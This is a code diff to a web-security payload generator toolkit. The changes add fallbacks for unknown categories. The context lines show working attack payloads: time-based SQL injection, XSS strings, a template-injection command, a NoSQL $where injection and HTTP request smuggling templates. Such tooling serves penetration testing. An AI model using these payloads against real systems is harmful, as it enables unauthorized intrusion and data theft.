@@ -614,7 +614,7 @@ export const TOOLS = [
           `' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -`,
         ],
       };
-      return sets[v.category].join("\n");
+      return (sets[v.category] || []).join("\n");
     } },
 
   { id: "w-xss-payload-gen", name: "XSS Payload Generator", cat: "websec", desc: "Generate a context-appropriate XSS proof-of-concept payload (HTML body / attribute / JS / URL context).", tags: ["xss", "payload"],
@@ -630,7 +630,7 @@ export const TOOLS = [
         "JavaScript string": `';alert('${m}');//\n\\';alert('${m}');//`,
         "URL/href": `javascript:alert('${m}')\ndata:text/html,<script>alert('${m}')</script>`,
       };
-      return gens[v.context];
+      return gens[v.context] || "";
     } },
 
   { id: "w-xss-context-encoder", name: "XSS Context Encoder", cat: "websec", desc: "Encode a payload for injection into a specific output context (HTML entities / JS string / URL / Base64).", tags: ["xss", "encode"],
@@ -672,7 +672,7 @@ export const TOOLS = [
           `<%= \`id\` %>`,
         ],
       };
-      return sets[v.engine].join("\n");
+      return (sets[v.engine] || []).join("\n");
     } },
 
   { id: "w-lfi-payloads", name: "LFI Payload List", cat: "websec", desc: "Local File Inclusion payloads: PHP wrappers and path-traversal depths for testing include/read endpoints.", tags: ["lfi", "php", "traversal"],
@@ -1036,7 +1036,7 @@ export const TOOLS = [
           `{"$where": "this.username == 'admin' && this.password.match(/^a/)"}`,
         ],
       };
-      return sets[v.category].join("\n");
+      return (sets[v.category] || []).join("\n");
     } },
 
   { id: "w-smuggling-cheatsheet", name: "HTTP Request Smuggling Templates", cat: "websec", desc: "CL.TE / TE.CL / TE.TE raw request templates for testing front-end/back-end parsing discrepancies.", tags: ["smuggling", "http", "cl.te", "te.cl"],
@@ -1049,6 +1049,7 @@ export const TOOLS = [
         "TE.CL": `POST / HTTP/1.1\r\nHost: ${host}\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n8\r\nSMUGGLED\r\n0\r\n\r\n`,
         "TE.TE (obfuscated)": `POST / HTTP/1.1\r\nHost: ${host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: xchunked\r\n\r\n0\r\n\r\n`,
       };
+      if (!templates[v.variant]) return "";
       return `${templates[v.variant]}\n\n(Front-end vs back-end must disagree on which header — CL or TE — governs framing. Test with a raw socket tool, not a browser. Front-end parses per the FIRST header pair for the given variant name; send exactly as shown including \\r\\n line endings.)`;
     } },
 
